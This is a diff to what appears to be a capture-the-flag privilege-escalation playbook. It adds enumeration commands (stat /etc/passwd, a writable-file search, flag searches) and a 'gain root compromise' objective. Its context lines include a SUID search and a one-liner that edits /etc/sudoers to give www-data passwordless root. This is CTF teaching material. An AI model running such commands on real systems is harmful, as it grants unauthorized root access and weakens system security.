@@ -258,6 +258,10 @@ ps aux | grep root
 # Check for SUID files in the sytem
 $ find / -perm -u=s -type f 2>/dev/null
 
+stat /etc/passwd
+
+find / -writeable > writeable-files.txt
+
 #Add user www-data to sudoers with no password
 $ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
@@ -333,7 +337,7 @@ except:
         sys.exit()
 ```
 # Actions on Objectives 
-Gather necessary CTF documentation (flags)
+Our object is to collect all the flags, and gain root compromise. Gather necessary CTF documentation (flags)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#celebration)  
 
 __Search for Flags__
@@ -345,10 +349,13 @@ find -03 -L /var/www/ -name "*flag*"
 
 find . -type f -exec grep "*flag*" '{}' \; -print
 
+locate *flag*
+
 # If you've found a flag and calculated size
 find / -size -[flag size] 
 
 locate "*flag*"
+ls -alSh
 
 # locate "hidden" files 
 ls -a 
